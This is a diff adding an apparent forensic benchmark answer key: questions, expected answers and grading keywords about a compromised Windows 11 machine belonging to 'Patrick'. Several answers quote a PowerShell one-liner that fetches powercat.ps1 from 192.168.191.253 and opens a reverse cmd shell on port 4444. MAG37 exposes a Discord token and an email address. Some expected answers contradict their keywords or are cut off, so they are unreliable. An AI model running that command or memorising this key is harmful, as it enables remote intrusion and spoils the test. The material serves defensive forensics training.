@@ -1,0 +1,1506 @@
+{
+    "scenario": "Background: Patrick is a user who enjoys gaming (particularly Minecraft) and stamp collecting. His Windows 11 system (Build 22543) shows signs of compromise including suspicious scripts, PowerShell-based attacks, and backdoor installation via ZeroTier VPN. The investigation requires identifying malicious artifacts, tracing the attack chain, and documenting user activities.",
+    "questions": [
+        {
+            "id": "MAG01",
+            "category": "retrieval",
+            "question": "What is the primary user account on this Windows system?",
+            "expected_answer": "The primary user account on this Windows system is \"Patrick\". Evidence includes:\n\nNTUSER.DAT registry hive located at C:\\Users\\Patrick\\NTUSER.DAT (last modified 2022-02-12 23:39:58)\nMultiple user activity artifacts in the registry showing paths like C:\\Users\\Patrick\\Downloads\\, C:\\Users\\Patrick\\AppData\\, etc.",
+            "keywords": [
+                "Patrick"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG02",
+            "category": "retrieval",
+            "question": "What is the Windows build number of this system?",
+            "expected_answer": "The Windows build number is 22543. This is Windows 10 version 21H2 (build 22543.1000), which is a Windows Insider Preview build from the Dev Channel (rs_prerelease.220122-2315).",
+            "keywords": [
+                [
+                    "22543",
+                    "Windows 11",
+                    "Insider Preview"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG03",
+            "category": "retrieval",
+            "question": "How many Event ID 4624 (successful logon) events are recorded in the Security event log?",
+            "expected_answer": "There are 1,414 Event ID 4624 (successful logon) events recorded in the Security event log.",
+            "keywords": [
+                "4624",
+                [
+                    "1414",
+                    "1,414"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG04",
+            "category": "retrieval",
+            "question": "How many Event ID 4647 (user logoff) events are recorded?",
+            "expected_answer": "There are 7 Event ID 4647 (user logoff) events recorded in the Windows Security Event Logs. All events show user \"Patrick\" logging off from the computer \"DESKTOP-SKPTDIO\" between February 4-12, 2022.",
+            "keywords": [
+                "4647",
+                [
+                    "7",
+                    "seven"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG05",
+            "category": "retrieval",
+            "question": "How many Event ID 4625 (failed logon) events are recorded?",
+            "expected_answer": "There are 7 total Event ID 4625 events recorded. However, I need to clarify that most of these (6 events) are from the Microsoft-Windows-EventSystem provider in the Application channel, which appear to be system configuration events rather than actual failed logon attempts. Only 1 event is from the Microsoft-Windows-Security-Auditing provider in the Security channel, which is the actual failed logon event.",
+            "keywords": [
+                "4625",
+                [
+                    "7",
+                    "seven"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG06",
+            "category": "retrieval",
+            "question": "How many Event ID 7045 (service installation) events exist?",
+            "expected_answer": "There are 54 Event ID 7045 (service installation) events in the forensic data.",
+            "keywords": [
+                "7045",
+                [
+                    "54",
+                    "56",
+                    "fifty"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG07",
+            "category": "retrieval",
+            "question": "What programs are configured to run at startup via registry Run keys?",
+            "expected_answer": "The registry Run keys configure the following programs to run at startup:\n\nOneDrive: \"C:\\Users\\Patrick\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background\nDiscord: C:\\Users\\Patrick\\AppData\\Local\\Discord\\Update.exe --processStart Discord.exe\nMicrosoft Edge: \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.",
+            "keywords": [
+                [
+                    "OneDrive",
+                    "onedrive",
+                    "Discord",
+                    "discord",
+                    "startup",
+                    "Run"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG08",
+            "category": "retrieval",
+            "question": "What is the PowerShell host version recorded in Event ID 4100?",
+            "expected_answer": "The PowerShell host version recorded in Event ID 4100 is 5.1.22543.1000. This appears in two Event ID 4100 entries from February 12, 2022, both showing the same Host Version and Engine Version of 5.1.22543.1000.",
+            "keywords": [
+                [
+                    "5.1.22543",
+                    "PowerShell 5.1",
+                    "5.1"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG09",
+            "category": "retrieval",
+            "question": "How many Event ID 4104 (PowerShell script block) events are recorded?",
+            "expected_answer": "There are 168 Event ID 4104 (PowerShell script block) events recorded in the event logs.",
+            "keywords": [
+                "4104"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG10",
+            "category": "retrieval",
+            "question": "How many total records are available for this forensic case?",
+            "expected_answer": "Total records: 548,180\n\nBreakdown by artifact type:\nMFT: 418,382 records (largest dataset)\nEventLog: 83,634 records\nSRUM: 33,067 records\nPrefetch: 1,415 records\nRegistry: 10,483 records\nShimcache: 498 records\nAmcache: 482 records\nBrowser: 88 records\nJumpList: 80 records\nLNK: 51 records\nPowerShell: 2 records\nRecycleBin: 0 records (not loaded)\nUsnJrnl: 0 records (not loaded)\n\nTime range: January 20, 2022 to February 4, 2026",
+            "keywords": [
+                [
+                    "548,180",
+                    "548180"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG11",
+            "category": "retrieval",
+            "question": "What version of ZeroTier VPN software is installed according to Shimcache?",
+            "expected_answer": "According to the Windows Event Log (MsiInstaller events), ZeroTier One version 1.8.4 was installed on February 6, 2022 at 07:17:26 and 07:16:09.\n\nThe Shimcache itself does not contain version information, but the Event Log shows ZeroTier VPN software version 1.8.4 was installed on this system.",
+            "keywords": [
+                [
+                    "ZeroTier",
+                    "zerotier"
+                ],
+                [
+                    "1.8.4"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG12",
+            "category": "retrieval",
+            "question": "What is the SHA1 hash of zerotier-one_x64.exe from Amcache?",
+            "expected_answer": "No file named \"zerotier-one_x64.exe\" is present in the Amcache or in any other artifact. The Amcache contains ZeroTier-related entries, but none with the exact filename \"zerotier-one_x64.exe\".\n\nThe ZeroTier executables found in the system are:\n\"zerotier_desktop_ui.",
+            "keywords": [
+                [
+                    "a5db8d5292b77e87",
+                    "SHA1",
+                    "sha1"
+                ],
+                [
+                    "zerotier",
+                    "ZeroTier"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG13",
+            "category": "retrieval",
+            "question": "What is the file size and creation date of DiscordSetup.exe in the Downloads folder?",
+            "expected_answer": "Found DiscordSetup.exe in the Downloads folder:\n\nFile size: 82,973,864 bytes (approximately 79.1 MB)\nCreation date: 2022-02-04 05:52:12.1493930\nLocation: .\\Users\\Patrick\\Downloads\\DiscordSetup.exe\nLast modified: 2022-02-04 05:52:20.3104112\nLast accessed: 2022-02-12 22:49:15.",
+            "keywords": [
+                [
+                    "82973864",
+                    "82,973,864"
+                ],
+                [
+                    "2022-02-04",
+                    "February 4"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG14",
+            "category": "retrieval",
+            "question": "What is the Discord application version found in Shimcache?",
+            "expected_answer": "The Shimcache shows Discord application version 1.0.9003. The Discord.exe file is located at C:\\Users\\Patrick\\AppData\\Local\\Discord\\app-1.0.9003\\Discord.exe with a timestamp of 2021-09-22 01:25:54.",
+            "keywords": [
+                "1.0.9003"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG15",
+            "category": "retrieval",
+            "question": "What is the Minecraft installer path found in Shimcache?",
+            "expected_answer": "Shimcache contains one Minecraft-related entry.\n\nThe Minecraft installer path found in Shimcache is: `C:\\Program Files\\WindowsApps\\Microsoft.4297127D64EC6_1.0.113.0_x64__8wekyb3d8bbwe\\Minecraft.exe`\n\nThis entry was last seen in Shimcache on December 17, 2021 at 20:56:02. This appears to be the Windows Store/UWP version of Minecraft installed via the Microsoft Store.",
+            "keywords": [
+                [
+                    "MinecraftInstaller",
+                    "Minecraft",
+                    "minecraft"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG16",
+            "category": "retrieval",
+            "question": "What is the Prefetch run count for JAVA.EXE and when was it last executed?",
+            "expected_answer": "JAVA.EXE has a Prefetch run count of 10 and was last executed on February 12, 2022 at 23:18:23. The executable is located at \"\\\\VOLUME{01d8067502ac9764-1002c20a}\\\\PROGRAM FILES (X86)\\\\COMMON FILES\\\\ORACLE\\\\JAVA\\\\JAVAPATH_TARGET_174898796\\\\JAVA.EXE\".",
+            "keywords": [
+                "JAVA.EXE"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG17",
+            "category": "retrieval",
+            "question": "What is the Prefetch run count for CHROME.EXE?",
+            "expected_answer": "The Prefetch run count for CHROME.EXE is 33. The most recent Prefetch entry shows CHROME.EXE was executed 33 times, with the last execution recorded on February 11, 2022 at 01:21:04. The executable is located at \\VOLUME{01d8067502ac9764-1002c20a}\\PROGRAM FILES\\GOOGLE\\CHROME\\APPLICATION\\CHROME.EXE.",
+            "keywords": [
+                "CHROME.EXE",
+                [
+                    "33",
+                    "thirty"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG18",
+            "category": "retrieval",
+            "question": "What is the Prefetch run count for MSEDGE.EXE?",
+            "expected_answer": "The Prefetch run count for MSEDGE.EXE is 66. This is consistent across multiple Prefetch entries from February 12, 2022, with the executable located at \"\\\\VOLUME{01d8067502ac9764-1002c20a}\\\\PROGRAM FILES (X86)\\\\MICROSOFT\\\\EDGE\\\\APPLICATION\\\\MSEDGE.EXE\". There's also an \"OP-MSEDGE.EXE-37D25F9A\" entry with a run count of 22.",
+            "keywords": [
+                "MSEDGE.EXE"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG19",
+            "category": "retrieval",
+            "question": "What is the Prefetch run count for CMD.EXE and when was it last run?",
+            "expected_answer": "CMD.EXE has a run count of 9 and was last run on 2022-02-12 at 23:38:07. The Prefetch file shows it was executed from both SYSTEM32 (64-bit) and SYSWOW64 (32-bit) directories, with the most recent execution being from SYSTEM32 at 23:38:07.",
+            "keywords": [
+                "CMD.EXE",
+                [
+                    "9",
+                    "nine"
+                ],
+                [
+                    "2022-02-12",
+                    "February 12"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG20",
+            "category": "retrieval",
+            "question": "What is the most frequently executed program according to Prefetch data?",
+            "expected_answer": "The most frequently executed program according to Prefetch data is SEARCHPROTOCOLHOST.EXE with a run count of 957 executions. This is significantly higher than the next most frequently executed programs: MOUSOCOREWORKER.EXE (277 runs) and IDENTITY_HELPER.EXE (271 runs).",
+            "keywords": [
+                [
+                    "SEARCHPROTOCOLHOST",
+                    "SearchProtocolHost"
+                ],
+                [
+                    "957"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG21",
+            "category": "retrieval",
+            "question": "What application generated the most network traffic (bytes sent) according to SRUM?",
+            "expected_answer": "The application that generated the most network traffic in terms of bytes sent is the blank/unnamed application (app_name: \"\") with 1,122,220,936 bytes sent (approximately 1.12 GB). It is followed by ZeroTierOneService with 621,936,877 bytes sent and DoSvc with 205,755,458 bytes sent.",
+            "keywords": [
+                [
+                    "ZeroTierOneService",
+                    "ZeroTier"
+                ],
+                [
+                    "621",
+                    "621,936"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG22",
+            "category": "retrieval",
+            "question": "How many bytes did Chrome send and receive according to SRUM?",
+            "expected_answer": "Chrome sent 23,992,104 bytes and received 547,048,934 bytes according to SRUM data. Total traffic: 571,041,038 bytes.",
+            "keywords": [
+                [
+                    "Chrome",
+                    "chrome",
+                    "SRUM"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG23",
+            "category": "retrieval",
+            "question": "How many bytes did Discord send according to SRUM?",
+            "expected_answer": "Discord sent 11,029,918 bytes (approximately 10.5 MB) according to SRUM data.",
+            "keywords": [
+                [
+                    "Discord",
+                    "discord",
+                    "SRUM"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG24",
+            "category": "retrieval",
+            "question": "How many bytes did Microsoft Edge send according to SRUM?",
+            "expected_answer": "Microsoft Edge sent 65,536,614 bytes according to SRUM (msedge.exe).",
+            "keywords": [
+                [
+                    "65,536,614",
+                    "65536614",
+                    "65,536"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG25",
+            "category": "retrieval",
+            "question": "What is the ZeroTier executable path from Amcache?",
+            "expected_answer": "The ZeroTier executable path from Amcache and other artifacts is:\n\nPrimary executable: `C:\\Program Files (x86)\\ZeroTier\\One\\zerotier_desktop_ui.exe` (found in registry UserAssist and SRUM data)\nThis path is confirmed by multiple sources: registry entries show `{ProgramFilesX86}\\ZeroTier\\One\\zerotier_desktop_ui.exe` and SRUM shows `\\Device\\HarddiskVolume3\\Program Files (x86)\\ZeroTier\\One\\zerotier_desktop_ui.",
+            "keywords": [
+                [
+                    "programdata\\zerotier",
+                    "Program Files",
+                    "zerotier-one_x64",
+                    "zerotier_desktop_ui"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG26",
+            "category": "retrieval",
+            "question": "What ZeroTier peer files exist in the MFT?",
+            "expected_answer": "Found 7 ZeroTier peer files in the MFT:\n\n8056c2e21c.peer (82 bytes, created 2022-02-09, last modified 2022-02-12 23:17:14)\ncafe9efeb9.peer (89 bytes, created 2022-02-12, last modified 2022-02-12 22:47:24)\n3dc13ae59d.peer (89 bytes, created 2022-02-09, last modified 2022-02-12 22:47:24)\ncafe7b4cdf.peer (89 bytes, created 2022-02-09, last modified 2022-02-11 22:48:26)\n62f865ae71.",
+            "keywords": [
+                [
+                    "peers.d",
+                    "peer"
+                ],
+                [
+                    "ZeroTier",
+                    "zerotier"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG27",
+            "category": "retrieval",
+            "question": "How many bytes did Java (Minecraft) send according to SRUM?",
+            "expected_answer": "According to SRUM, Java executables sent a total of 524,992 bytes. The specific Java executable related to Minecraft (located in the Microsoft runtime package) sent 376,904 bytes. The SRUM records show 0 bytes for individual timestamp entries, indicating the traffic data may be aggregated differently in the summary statistics.\n\nTotal bytes sent by Java executables: 524,992 bytes. The javaw.",
+            "keywords": [
+                [
+                    "524",
+                    "376",
+                    "java",
+                    "Java"
+                ],
+                [
+                    "10,504",
+                    "bytes",
+                    "SRUM"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG28",
+            "category": "retrieval",
+            "question": "How many bytes did OneDrive send and receive according to SRUM?",
+            "expected_answer": "OneDrive sent 8,401,390 bytes and received 7,948,067 bytes according to SRUM data. The main OneDrive.exe process sent 7,895,740 bytes and received 6,893,752 bytes, accounting for most of the traffic.",
+            "keywords": [
+                [
+                    "8,401,390",
+                    "8401390",
+                    "8,401"
+                ],
+                [
+                    "7,948,067",
+                    "7948067",
+                    "7,948"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG29",
+            "category": "retrieval",
+            "question": "What is the IP address and port used for the backdoor download?",
+            "expected_answer": "The PowerShell event logs show that the backdoor download used IP address 192.168.191.253 and port 4444.\n\nThe exact command executed was: `powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.253 -p 4444 -e cmd`\n\nThis is a two-stage attack:\n1. Download powercat.ps1 from http://192.168.191.253:8000/powercat.ps1\n2.",
+            "keywords": [
+                "192.168.191.253",
+                [
+                    "8000",
+                    "powercat"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG30",
+            "category": "retrieval",
+            "question": "What PowerShell event (Event ID 4100) shows the backdoor download activity?",
+            "expected_answer": "The backdoor download activity appears in PowerShell Event ID 4100:\n\nEvent ID 4100 at 2022-02-12 22:50:00.3629319 shows PowerShell executing: `powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.253 -p 4444 -e cmd`\nThis command downloads and executes powercat.ps1 from attacker IP 192.168.191.",
+            "keywords": [
+                "4100",
+                [
+                    "PowerShell",
+                    "powershell",
+                    "backdoor"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG31",
+            "category": "retrieval",
+            "question": "What is the most visited domain in browser history?",
+            "expected_answer": "The most visited domain is www.minecraft.net with 19 visits, followed by www.youtube.com and login.live.com with 12 visits each. The Minecraft site was visited 19 times between February 4, 2022 at 04:52:12 and 04:53:43.",
+            "keywords": [
+                [
+                    "minecraft.net",
+                    "Minecraft"
+                ],
+                [
+                    "22",
+                    "twenty"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG32",
+            "category": "retrieval",
+            "question": "What Google search did Patrick perform about hacking on 2022-02-11?",
+            "expected_answer": "Patrick performed two Google searches about hacking on 2022-02-11:\n\nAt 01:18:02 UTC: \"how to know if you've been hacked\"\nAt 01:21:05 UTC: \"how to report a hacker?\"\n\nBoth searches were made using Chromium browser and each had 2 visit counts.",
+            "keywords": [
+                [
+                    "how to report a hacker",
+                    "report a hacker"
+                ],
+                [
+                    "2022-02-11",
+                    "February 11"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG33",
+            "category": "retrieval",
+            "question": "What Google search did Patrick perform about networking on 2022-02-06?",
+            "expected_answer": "Patrick performed a Google search for \"what are packets\" on 2022-02-06 at 07:10:15 UTC. The search was conducted through Chromium browser and was visited twice.",
+            "keywords": [
+                "what are packets",
+                [
+                    "2022-02-06",
+                    "February 6"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG34",
+            "category": "retrieval",
+            "question": "What Minecraft-related Google search error did Patrick encounter?",
+            "expected_answer": "The browser history shows the following Minecraft-related Google searches by Patrick:\n\n1. \"minecraft installer error 0x80131509\" on February 4, 2022 at 05:10:37\n2. \"minecraft installer error 0x80131509 site:microsoft.",
+            "keywords": [
+                "0x80131509",
+                [
+                    "minecraft installer",
+                    "Minecraft"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG35",
+            "category": "retrieval",
+            "question": "What stamp-related YouTube videos did Patrick watch on 2022-02-05?",
+            "expected_answer": "Patrick watched two stamp-related YouTube videos on February 5, 2022:\n\n\"The Art of the Stamp, Maynard Sundman Lecture 2012\" at 07:18:50 UTC (URL: https://www.youtube.com/watch?v=yN2qUzi0E6Y)\n\"How to Value and Sell a Stamp Collection\" at 01:32:22 UTC (URL: https://www.youtube.com/watch?v=z8NvI1eM66c)\n\nBoth videos were viewed using Chromium browser on February 5, 2022.",
+            "keywords": [
+                [
+                    "stamp",
+                    "Stamp"
+                ],
+                [
+                    "YouTube",
+                    "youtube"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG36",
+            "category": "retrieval",
+            "question": "When did Patrick first visit minecraft.net according to browser history?",
+            "expected_answer": "The earliest timestamp for a www.minecraft.net visit is:\n\n2022-02-04T04:53:08.414104Z for \"https://www.minecraft.net/en-us/login#state=login&accessToken=...\"\n\nThis is the earliest minecraft.net visit in the browser history covered by this result. Browser history for minecraft-related searches or other minecraft domains may contain earlier visits.",
+            "keywords": [
+                [
+                    "minecraft.net",
+                    "Minecraft",
+                    "minecraft"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG37",
+            "category": "retrieval",
+            "question": "What Discord verification URL appears in browser history?",
+            "expected_answer": "The Discord verification URL found in browser history is: https://discord.com/verify#token=eyJpZCI6OTM0MTk3NzgwMTk1NDY3MzA1LCJlbWFpbCI6InBiZW50bGV5MDEwN0BnbWFpbC5jb20ifQ.YesmDw.DmjbZiQHboDnE9CnQy4wHzA7SNU\n\nThis verification URL was accessed on 2022-01-22T00:33:06.846895Z via Chromium browser. The token appears to contain an ID (934197780195467305) and email address (pbentley0107@gmail.com).",
+            "keywords": [
+                [
+                    "discord.com/verify",
+                    "discord.com"
+                ],
+                [
+                    "2022-01-22",
+                    "January 22"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG38",
+            "category": "retrieval",
+            "question": "How many browser history records reference accounts.google.com?",
+            "expected_answer": "There are 7 browser history records referencing accounts.google.com. All records are from Chromium browser on January 20, 2022, showing Gmail login activity for the user pbentley0107@gmail.com.",
+            "keywords": [
+                "accounts.google.com",
+                [
+                    "7",
+                    "seven"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG39",
+            "category": "retrieval",
+            "question": "What is the earliest timestamp in the browser history?",
+            "expected_answer": "The earliest timestamp in the browser history is 2022-01-20T06:48:31.698503Z. This corresponds to the first visit to mail.google.com and www.google.com domains.",
+            "keywords": [
+                [
+                    "2022-01-20",
+                    "January 20"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG40",
+            "category": "retrieval",
+            "question": "How many total browser history records are available for this case?",
+            "expected_answer": "There are 88 browser history records available for this case.",
+            "keywords": [
+                [
+                    "88",
+                    "browser",
+                    "history"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG41",
+            "category": "retrieval",
+            "question": "What is the full path to the suspicious BAT script found on the system?",
+            "expected_answer": "1. There is a suspicious BAT file named \"matrix.bat\" located in a suspicious directory called \"lolololol\" under the user Patrick's profile.\n2. Windows Defender detected Meterpreter malware (Behavior:Win32/Meterpreter.gen!A) on 2022-02-12 at 04:30:12, which was associated with PowerShell execution.\n3. The matrix.",
+            "keywords": [
+                "matrix.bat",
+                [
+                    "lolololol",
+                    "Patrick"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG42",
+            "category": "retrieval",
+            "question": "What is the file size and creation date of matrix.bat?",
+            "expected_answer": "The file matrix.bat has a size of 164 bytes and was created on 2022-02-12 00:41:13.8495898. It's located at .\\Users\\Patrick\\lolololol\\matrix.bat.",
+            "keywords": [
+                [
+                    "164",
+                    "bytes"
+                ],
+                [
+                    "2022-02-12",
+                    "February 12",
+                    "00:41"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG43",
+            "category": "retrieval",
+            "question": "What malicious VBS file was detected by Windows Defender (Event ID 1116)?",
+            "expected_answer": "The available Windows Defender Event ID 1116 events contain only one detection:\n\nWindows Defender detected \"Behavior:Win32/Meterpreter.gen!A\" (Threat ID: 2147723573) on 2022-02-12 at 04:30:12.770Z\nThe detection was related to PowerShell execution (C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.",
+            "keywords": [
+                [
+                    "xPSPLcEr",
+                    "Defender",
+                    "1116"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG44",
+            "category": "retrieval",
+            "question": "How many Windows Defender detection events (Event ID 1116) are recorded?",
+            "expected_answer": "There are 21 Windows Defender detection events with Event ID 1116 recorded in the system. These events show detections of \"Behavior:Win32/Meterpreter.gen!A\" (Meterpreter malware) with severe severity, detected on February 12, 2022 at 04:30:12 UTC, involving PowerShell processes.",
+            "keywords": [
+                "1116",
+                [
+                    "Defender",
+                    "detection"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG45",
+            "category": "retrieval",
+            "question": "What is the full backdoor download URL found in PowerShell event logs?",
+            "expected_answer": "The full backdoor download URL found in PowerShell event logs is: `http://192.168.191.253:8000/powercat.ps1`\n\nThis URL appears in multiple PowerShell Event ID 400 and 600 logs showing the command: `powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.191.253:8000/powercat.ps1');powercat -c 192.168.191.",
+            "keywords": [
+                "192.168.191.253",
+                "powercat.ps1"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG46",
+            "category": "retrieval",
+            "question": "How many PowerShell event ID 4100 events are recorded?",
+            "expected_answer": "There are 10 PowerShell Event ID 4100 events recorded in the Windows Event Logs.",
+            "keywords": [
+                "4100",
+                [
+                    "10",
+                    "ten"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG47",
+            "category": "retrieval",
+            "question": "What is the Prefetch run count for POWERSHELL.EXE?",
+            "expected_answer": "The Prefetch run count for POWERSHELL.EXE is 37. This is consistent across all Prefetch entries for POWERSHELL.EXE found in the data, with the most recent timestamp being 2022-02-12 23:38:09.",
+            "keywords": [
+                "POWERSHELL.EXE",
+                [
+                    "37",
+                    "thirty"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG48",
+            "category": "retrieval",
+            "question": "What is the file size and creation date of goteem.ps1?",
+            "expected_answer": "According to the MFT record, goteem.ps1 has a file size of 3,246 bytes and was created on 2022-02-11 at 23:19:23.1880799 UTC. The file is located at C:\\Users\\Patrick\\Documents\\Minecraft\\goteem.ps1.",
+            "keywords": [
+                [
+                    "3246",
+                    "3,246"
+                ],
+                [
+                    "2022-02-11",
+                    "February 11",
+                    "23:19"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG49",
+            "category": "retrieval",
+            "question": "What is the file size and creation date of goteem2.ps1?",
+            "expected_answer": "According to the MFT record, goteem2.ps1 has a file size of 3,234 bytes and was created on February 11, 2022 at 23:25:57.5239007. The file is located at C:\\Users\\Patrick\\Documents\\Minecraft\\goteem2.ps1.",
+            "keywords": [
+                [
+                    "3234",
+                    "3,234"
+                ],
+                [
+                    "2022-02-11",
+                    "February 11",
+                    "23:25"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG50",
+            "category": "retrieval",
+            "question": "What is the content and creation date of goteem.txt?",
+            "expected_answer": "Creation date: goteem.txt was created on February 11, 2022 at 01:20:15.8261483 UTC\nFile location: C:\\Users\\Patrick\\Documents\\Minecraft\\goteem.txt\nFile size: 42 bytes\nLast modified: February 11, 2022 at 01:20:15.8558518 UTC\nLast accessed: February 11, 2022 at 01:20:42.4607435 UTC\n\nContent: The forensic artifacts do not contain the actual file content of goteem.txt.",
+            "keywords": [
+                [
+                    "42",
+                    "bytes"
+                ],
+                [
+                    "2022-02-11",
+                    "February 11"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG51",
+            "category": "retrieval",
+            "question": "What is the creation timestamp of the xPSPLcEr.vbs detection event?",
+            "expected_answer": "The xPSPLcEr.vbs file was detected by Windows Defender as \"TrojanDropper:VBS/Ploty.A\" with the following detection timestamps:\n\nDetection Time (first event): 2022-02-12T01:47:35.",
+            "keywords": [
+                [
+                    "xPSPLcEr",
+                    "Defender",
+                    "vbs"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG52",
+            "category": "retrieval",
+            "question": "How many EventLog records reference powercat?",
+            "expected_answer": "101 EventLog records reference powercat (107 under a case-insensitive substring match). They are Microsoft-Windows-PowerShell/Operational Event ID 4100 records carrying the command line that downloads powercat.ps1 from http://192.168.191.253:8000/ and connects to 192.168.191.253 on port 4444.",
+            "keywords": [
+                [
+                    "101",
+                    "107"
+                ],
+                "powercat"
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG53",
+            "category": "retrieval",
+            "question": "How many EventLog records reference xPSPLcEr?",
+            "expected_answer": "Six EventLog records reference xPSPLcEr. They are Microsoft-Windows-Windows Defender/Operational Event ID 1116 detections of xPSPLcEr.vbs. Note that a search for the bare token xPSPLcEr returns nothing because the value is indexed as part of xPSPLcEr.vbs.",
+            "keywords": [
+                [
+                    "6",
+                    "six",
+                    "xPSPLcEr"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG54",
+            "category": "retrieval",
+            "question": "What is the Defender antivirus product version that detected the malware?",
+            "expected_answer": "The Defender antivirus product version that detected the malware \"Behavior:Win32/Meterpreter.gen!A\" is 4.18.2201.10, as recorded in the Windows Defender Event ID 1116 detection events.\n\nThis version was recorded in multiple detection events on February 12, 2022 at 04:30:12.",
+            "keywords": [
+                [
+                    "Defender",
+                    "Microsoft Defender",
+                    "antivirus"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG55",
+            "category": "retrieval",
+            "question": "What is the ZeroTier driver filename found in Amcache?",
+            "expected_answer": "The ZeroTier driver filename is zttap300.sys, identified in the MFT. The Amcache data shows ZeroTier entries but does not display the actual filenames. This file is located at `.\\ProgramData\\ZeroTier\\One\\tap-windows\\x64\\zttap300.sys` with a file size of 31,744 bytes, created on 2021-06-30 23:57:12.",
+            "keywords": [
+                "zttap300.sys",
+                [
+                    "ZeroTier",
+                    "zerotier"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG56",
+            "category": "retrieval",
+            "question": "What files appear in the Quick Access JumpList?",
+            "expected_answer": "Files in the Quick Access JumpList:\n\nC:\\Users\\Patrick\\Documents\\Minecraft\\goteem2.ps1 (accessed 2022-02-12 00:04:42)\nC:\\Users\\Patrick\\Documents\\Minecraft\\goteem.ps1 (accessed 2022-02-11 23:22:52)\nC:\\Users\\Patrick\\Documents\\Minecraft\\eula.txt (accessed 2022-02-06 07:56:04)\nC:\\Users\\Patrick\\Desktop\\goteem.txt (no timestamp)\nC:\\Users\\Patrick\\Downloads\\note.txt (no timestamp)\nC:\\Users\\Patrick\\Music\\fred.",
+            "keywords": [
+                [
+                    "goteem",
+                    "goteem2"
+                ],
+                [
+                    "eula.txt",
+                    "note.txt"
+                ]
+            ],
+            "expected_facts": {}
+        },
+        {
+            "id": "MAG57",
+            "category": "retrieval",
+            "question": "What LNK shortcut points to the Minecraft eula.txt?",
+            "expected_answer": "The LNK shortcut \"eula.lnk\" points to the Minecraft eula.txt file. The shortcut target path is \"C:\\Users\\Patrick\\Documents\\Minecraft\\This PC\\Documents\\Minecraft\\eula.txt\" with a working directory of \"C:\\Users\\Patrick\\Documents\\Minecraft\". The shortcut was created on 2026-02-04 11:09:30 and last accessed on 2026-02-04 11:10:08.",
+            "keywords": [
+                "eula.txt",
+                [
+                    "Minecraft",
+                    "Documents"
+                ]
+            ],
